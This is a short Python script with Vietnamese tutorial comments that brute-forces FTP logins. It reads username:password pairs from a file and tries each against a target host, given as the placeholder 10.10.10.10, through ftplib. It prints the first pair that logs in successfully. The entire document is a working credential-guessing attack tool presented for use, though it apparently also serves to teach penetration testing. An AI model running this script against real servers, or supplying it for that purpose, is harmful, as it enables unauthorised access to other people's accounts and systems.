# Đoạn code python dưới đây thực hiện brute-force dịch vụ FTP
# với file passlogin có dạng "username:password"
# Import thư viện ftplib để tạo kết nối client tới FTP server
import ftplib
# Hàm brute-force FTP serves
def brute_Login(hostname, passwd_file):
    # Sử dụng with để thực hiện thao tác đóng mở file để thao tác dữ liệu 
    with open(passwd_file, 'r') as pf:
        # Vòng lặp for lặp qua từng dòng với 'readlines()'
        # để lấy giá trị username và password
        for line in pf.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1]
            print('[+] Trying: ' + userName + '/' + passWord)
            try:
                # Tạo Object connection FTP client
                ftp = ftplib.FTP(hostname)
                # Thực hiện connection login FTP server
                ftp.login(userName, passWord)
                # In Succeeded nếu thành công ( không có exception)
                print('\n[*] ' + str(hostname) + 
                ' FTP Login Succeeded: ' + userName + '/' + passWord)
                ftp.quit()
                return (userName, passWord)
            except Exception:
                pass
    # Duyệt hết file k có kết quả , in ra thông báo.
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)
# Test với host mục tiêu ( ở đây giả định 10.10.10.10)
host = '10.10.10.10'
# Đường dẫn tuyệt đối hoặc tương đối tới file password
passwdFile = 'path/to/password/file'
brute_Login(host,passwdFile)
